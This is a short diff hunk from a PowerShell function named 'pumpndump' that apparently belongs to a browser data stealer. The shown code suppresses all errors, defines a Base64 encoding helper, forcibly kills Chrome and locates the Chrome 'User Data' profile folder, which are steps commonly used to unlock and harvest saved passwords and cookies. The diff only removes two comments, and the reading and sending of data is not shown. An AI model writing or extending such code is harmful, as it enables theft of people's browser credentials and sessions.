@@ -5,13 +5,11 @@ function pumpndump
     )
     $ErrorActionPreference = 'SilentlyContinue'
 
-    # Helper: simple Base64 encode
     function B64 {
         param([String]$Text)
         return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Text))
     }
 
-    # Google Chrome + Profiles
     try {
         Stop-Process -Name "chrome" -Force
         $chrome_path = "$env:LOCALAPPDATA\Google\Chrome\User Data"
